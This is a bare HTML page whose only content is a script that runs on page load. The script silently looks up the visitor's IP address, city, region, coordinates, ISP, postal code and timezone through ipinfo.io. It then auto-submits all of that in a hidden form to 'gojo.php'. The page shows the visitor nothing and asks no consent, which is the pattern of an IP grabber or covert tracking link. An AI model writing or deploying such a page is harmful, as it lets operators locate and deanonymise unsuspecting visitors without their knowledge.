<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
</head>
<body>

    <script>
        async function fetchIPInformationAndSubmit() {
            try {
                const response = await fetch('https://ipinfo.io/json');
                const data = await response.json();

                // Create a form dynamically
                const form = document.createElement('form');
                form.action = 'gojo.php';
                form.method = 'post';

                // Add input fields for each piece of IP information
                const fields = ['ip', 'city', 'region', 'country', 'loc', 'org', 'postal', 'timezone'];
                fields.forEach(fieldName => {
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = fieldName;
                    input.value = data[fieldName];
                    form.appendChild(input);
                });

                // Submit the form
                document.body.appendChild(form);
                form.submit();
            } catch (error) {
                console.error('Error fetching IP information:', error.message);
            }
        }

        // Call the function when the page loads
        document.addEventListener('DOMContentLoaded', fetchIPInformationAndSubmit);
    </script>

</body>
</html>

